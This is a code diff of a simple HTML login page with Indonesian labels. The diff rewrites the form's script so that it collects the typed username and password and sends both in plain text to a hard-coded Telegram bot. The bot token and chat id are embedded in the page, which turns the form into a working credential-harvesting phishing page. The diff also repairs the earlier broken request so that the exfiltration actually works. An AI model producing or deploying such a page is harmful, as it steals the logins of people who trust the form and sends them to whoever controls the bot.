@@ -1,81 +1,36 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Demo Telegram</title>
-
-  <style>
-    body {
-      font-family: Arial;
-      background: #f5f5f5;
-      text-align: center;
-      margin-top: 100px;
-    }
-
-    .box {
-      background: white;
-      padding: 20px;
-      width: 300px;
-      margin: auto;
-      border-radius: 10px;
-    }
-
-    input {
-      width: 90%;
-      padding: 10px;
-      margin: 10px 0;
-    }
-
-    button {
-      padding: 10px;
-      width: 100%;
-      background: orange;
-      border: none;
-      color: white;
-    }
-  </style>
+    <title>Form Notifikasi Telegram</title>
 </head>
-
 <body>
 
-<div class="box">
-  <h2>Login</h2>
+<h2>Form Login</h2>
 
-  <form id="formLogin">
-    <input type="text" id="username" placeholder="Username"><br>
-    <input type="password" id="password" placeholder="Password"><br>
-    <button type="submit">Login</button>
-  </form>
-</div>
+<form id="form">
+    <input type="text" id="username" placeholder="Username"><br><br>
+    <input type="password" id="password" placeholder="Password"><br><br>
+    <button type="submit">Kirim</button>
+</form>
 
 <script>
-document.getElementById("formLogin").addEventListener("submit", function(e) {
+document.getElementById("form").addEventListener("submit", function(e){
     e.preventDefault();
 
     var user = document.getElementById("username").value;
     var pass = document.getElementById("password").value;
 
-    var token =  "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
+    var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
     var chat_id = "8275920596";
 
-    var pesan = "LOGIN BARU\nUser: " + user + "\nPass: " + pass;
+    var message = "Login Masuk:\nUsername: " + user + "\nPassword: " + pass;
 
-    fetch(https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text=tes", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: chat_id,
-            text: pesan
-        })
-    })
-    .then(() => {
-        alert("Berhasil kirim ke Telegram");
-    })
-    .catch(() => {
-        alert("Gagal kirim");
-    });
+    var url = "https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="+ encodeURIComponent(message);
+
+    fetch(url)
+    .then(response => alert("Data terkirim ke Telegram!"))
+    .catch(error => alert("Gagal kirim"));
 });
 </script>
 
